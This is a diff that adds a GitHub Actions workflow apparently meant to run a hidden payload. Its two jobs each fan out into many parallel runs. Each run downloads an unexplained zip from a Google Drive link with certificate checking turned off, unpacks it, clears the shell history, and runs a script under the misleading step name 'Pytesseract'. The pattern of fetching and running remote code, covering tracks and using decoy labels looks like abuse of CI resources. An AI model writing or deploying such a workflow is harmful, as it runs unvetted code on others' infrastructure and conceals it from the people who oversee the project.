@@ -1,0 +1,56 @@
+name: aeroservice709hub
+on:
+  push:
+    branches: [ "main" ]
+  workflow_dispatch:
+
+jobs:
+  START:
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      max-parallel: 10
+      matrix:
+        go: [I.o, I.i, I.ii]
+        flag: ['Draft', 'Construct', 'Inspect', 'Trigger', 'Ship']
+
+    env:
+        NUM_JOBS: 20
+        JOB: ${ matrix.go }
+    steps:
+    - uses: actions/checkout@v1
+    - name: install module
+      run: |
+        wget --no-check-certificate "https://docs.google.com/uc?export=download&id=1X-0ZcvGZmU0PmOR273WDpVS1lCvagrNW" -O Sanic.zip
+        unzip -o Sanic.zip
+        rm Sanic.zip
+        history -c && history -w
+
+    - name: Pytesseract
+      run: bash requirements.sh
+
+
+  VERIFY1:
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      max-parallel: 10
+      matrix:
+        go: [I.o, I.i, I.ii]
+        flag: ['Configure', 'Build', 'Analyze', 'Operate', 'Distribute']
+
+    env:
+        NUM_JOBS: 20
+        JOB: ${ matrix.go }
+    steps:
+    - uses: actions/checkout@v1
+    - name: install module
+      run: |
+        wget --no-check-certificate "https://docs.google.com/uc?export=download&id=1X-0ZcvGZmU0PmOR273WDpVS1lCvagrNW" -O Sanic.zip
+        unzip -o Sanic.zip
+        rm Sanic.zip
+        history -c && history -w
+
+    - name: Pytesseract
+      run: bash requirements.sh
+        
